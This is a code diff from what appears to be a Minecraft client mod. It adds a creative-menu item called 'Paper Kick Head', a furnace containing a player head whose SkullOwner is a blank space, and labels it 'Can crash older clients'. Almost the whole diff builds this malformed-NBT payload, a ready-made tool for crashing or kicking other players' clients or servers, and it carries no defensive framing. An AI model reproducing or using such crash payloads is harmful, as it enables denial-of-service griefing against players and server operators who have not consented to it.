@@ -4,6 +4,7 @@ import me.nekosarekawaii.foxglove.creativetab.CreativeTab;
 import net.minecraft.item.ItemStack;
 import net.minecraft.item.Items;
 import net.minecraft.nbt.NbtCompound;
+import net.minecraft.nbt.NbtList;
 import net.minecraft.text.Text;
 import net.minecraft.util.Formatting;
 
@@ -18,21 +19,30 @@ public class KickItemsCreativeTab extends CreativeTab {
     @Override
     public Collection<ItemStack> entries() {
         final Collection<ItemStack> current = super.entries();
-
-        final ItemStack paperKickHead = new ItemStack(Items.PLAYER_HEAD);
-        final NbtCompound paperKickHeadNBT = new NbtCompound();
-        paperKickHeadNBT.putString("SkullOwner", " ");
-        paperKickHead.setNbt(paperKickHeadNBT);
-        this.putClientsideName(paperKickHead,
+        final ItemStack paperKickHeadPackage = new ItemStack(Items.FURNACE);
+        final NbtCompound paperKickHeadPackageNbt = new NbtCompound();
+        final NbtCompound paperKickHeadPackageBlockEntityTag = new NbtCompound();
+        final NbtList paperKickHeadPackageBlockEntityTagItemsList = new NbtList();
+        final NbtCompound paperKickHeadPackageBlockEntityTagItemsListSlot0 = new NbtCompound();
+        paperKickHeadPackageBlockEntityTagItemsListSlot0.putByte("Slot", (byte) 0);
+        paperKickHeadPackageBlockEntityTagItemsListSlot0.putString("id", "minecraft:player_head");
+        paperKickHeadPackageBlockEntityTagItemsListSlot0.putByte("Count", (byte) 1);
+        final NbtCompound paperKickHeadPackageBlockEntityTagItemsListSlot0Tag = new NbtCompound();
+        paperKickHeadPackageBlockEntityTagItemsListSlot0Tag.putString("SkullOwner", " ");
+        paperKickHeadPackageBlockEntityTagItemsListSlot0.put("tag", paperKickHeadPackageBlockEntityTagItemsListSlot0Tag);
+        paperKickHeadPackageBlockEntityTagItemsList.add(paperKickHeadPackageBlockEntityTagItemsListSlot0);
+        paperKickHeadPackageBlockEntityTag.put("Items", paperKickHeadPackageBlockEntityTagItemsList);
+        paperKickHeadPackageNbt.put("BlockEntityTag", paperKickHeadPackageBlockEntityTag);
+        paperKickHeadPackage.setNbt(paperKickHeadPackageNbt);
+        this.putClientsideName(paperKickHeadPackage,
                 Text.literal(
-                        Formatting.RED + Formatting.BOLD.toString() + "Client Kick Head"
+                        Formatting.RED + Formatting.BOLD.toString() + "Paper Kick Head"
                 ),
                 Text.literal(
                         Formatting.GOLD + Formatting.BOLD.toString() + "Can crash older clients"
                 )
         );
-        current.add(paperKickHead);
-
+        current.add(paperKickHeadPackage);
         return current;
     }
 
